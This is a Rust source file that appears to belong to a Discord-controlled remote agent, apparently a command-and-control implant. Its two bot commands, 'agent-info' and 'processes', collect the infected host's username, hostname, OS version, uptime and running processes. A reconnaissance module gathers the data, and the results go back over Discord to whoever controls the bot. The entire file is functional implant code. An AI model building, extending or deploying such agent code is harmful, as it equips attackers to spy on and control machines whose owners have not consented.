use std::fmt::Write;

use tracing::debug;

use crate::{
	constants::MAX_DISCORD_CHARS, os::traits::recon::ReconModule, reply, reply_as_attachment, RuscordContext,
	RuscordError,
};
/// Obtains information about the current host.
#[poise::command(prefix_command, slash_command, rename = "agent-info")]
pub async fn agent_info(ctx: RuscordContext<'_>) -> Result<(), RuscordError> {
	let os = &ctx.data().os_module;

	let (hostname, username, version) = (os.hostname(), os.username(), os.os_version());
	let uptime = ctx.data().initialization_time.elapsed().as_secs();

	reply!(
		ctx,
		"```\nUptime: {}s\nUser@Host: {}\nOS Version: {}```",
		uptime,
		format!("{username}@{hostname}"),
		version
	);
	Ok(())
}

/// Retrieves a list of processes running on the current host, with an optional
/// filter to search for.
#[poise::command(prefix_command, slash_command)]
pub async fn processes(
	ctx: RuscordContext<'_>, #[description = "Keyword to search for"] filter: Option<String>,
) -> Result<(), RuscordError> {
	let os_module = &ctx.data().os_module;
	let processes = os_module.processes();

	match processes {
		Some(processes) => {
			let filtered_list: Vec<_> = match filter {
				Some(filter) => {
					let lowercase_filter = filter.to_lowercase();
					processes
						.into_iter()
						.filter(|s| s.name.to_lowercase().contains(&lowercase_filter))
						.collect()
				},
				None => processes,
			};

			if filtered_list.is_empty() {
				reply!(ctx, "No processes found");
				return Ok(());
			}

			let mut buffer = String::with_capacity(1024);
			for entry in filtered_list {
				writeln!(buffer, "ppid: {} pid: {} {}", entry.ppid, entry.pid, entry.name)?;
			}

			if buffer.len() > MAX_DISCORD_CHARS {
				debug!("buffer was too large to send: {}", buffer.len());
				reply_as_attachment!(ctx, buffer, "processes.txt");
			} else {
				let mut final_str = String::with_capacity(buffer.len() + 6);
				final_str.push_str("```\n");
				final_str.push_str(buffer.as_str());
				final_str.push_str("```\n");
				reply!(ctx, "{}", final_str);
			}
		},
		None => {
			reply!(ctx, "No processes found");
			return Ok(());
		},
	}

	Ok(())
}
